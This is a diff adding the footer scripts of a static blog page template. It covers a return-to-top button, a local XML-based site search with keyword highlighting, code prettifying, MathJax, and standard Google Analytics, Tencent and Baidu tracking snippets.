+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
